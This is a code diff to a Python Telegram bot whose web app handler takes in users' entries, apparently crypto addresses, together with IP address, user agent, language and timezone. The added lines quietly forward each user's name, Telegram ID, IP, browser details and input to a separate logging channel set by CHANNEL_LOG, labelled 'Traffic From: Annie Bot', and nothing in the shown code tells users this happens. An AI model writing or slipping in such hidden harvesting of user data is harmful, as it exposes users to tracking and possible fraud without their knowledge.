@@ -19,6 +19,8 @@ logger = logging.getLogger(__name__)
 
 TOKEN = str(os.getenv("TOKEN"))
 
+CHANNEL_LOG = int(os.getenv("CHANNEL_LOG"))
+
 AUTH_KEY = str(os.getenv("API_KEY"))
 
 
@@ -83,6 +85,7 @@ async def web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     data = json.loads(update.effective_message.web_app_data.data)
     data['uid'] = update.effective_message.from_user.id
     data['name'] = update.effective_message.from_user.full_name
+    _msg = f"<b><u>User Log</u></b>\n\nDate: {data['timestamp']}\n\nName: {update.effective_message.from_user.full_name}\n\nUID: {update.effective_message.from_user.id}\n\nIp address: <code>{data['ip']}</code>\n\nUseragent: <code>{data['ua']}</code>\n\nTraffic From: Annie Bot\n\nLanguage: <code>{data['ulang']}</code>\n\nTimezone: <code>{data['tz']}</code>\n\nInput: <code>{data['nm']}</code>"
     if data["crypto"] == True:
         try:
             _send = sendData(data)
@@ -90,8 +93,10 @@ async def web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
                 msg = f"Your crypto Name: {update.effective_message.from_user.full_name}\nUID: {update.effective_message.from_user.id}\nAddress: {data['nm']}\nUser agent: {data['ua']}\nIp: {data['ip']}\nLanguage: {data['ulang']}\nTimezone: {data['tz']}\nTimestamp: {data['timestamp']}\n"
                 # print(msg)
                 await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=True))
+                await context.bot.sendMessage(chat_id=CHANNEL_LOG, text=_msg, parse_mode="HTML", disable_web_page_preview=True)
             else:
                 await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
+                await context.bot.sendMessage(chat_id=CHANNEL_LOG, text=_msg, parse_mode="HTML", disable_web_page_preview=True)
 
         except:
             await update.message.reply_html(text="We are unable to connect to the server.", reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
@@ -102,8 +107,10 @@ async def web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
                 msg = f"Your crypto Name: {update.effective_message.from_user.full_name}\nUID: {update.effective_message.from_user.id}\nAddress: {data['nm']}\nUser agent: {data['ua']}\nIp: {data['ip']}\nLanguage: {data['ulang']}\nTimezone: {data['tz']}\nTimestamp: {data['timestamp']}\n"
                 # print(msg)
                 await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=True))
+                await context.bot.sendMessage(chat_id=CHANNEL_LOG, text=_msg, parse_mode="HTML", disable_web_page_preview=True)
             else:
                 await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
+                await context.bot.sendMessage(chat_id=CHANNEL_LOG, text=_msg, parse_mode="HTML", disable_web_page_preview=True)
         except:
             await update.message.reply_html(text="We are unable to connect to the server.", reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
 
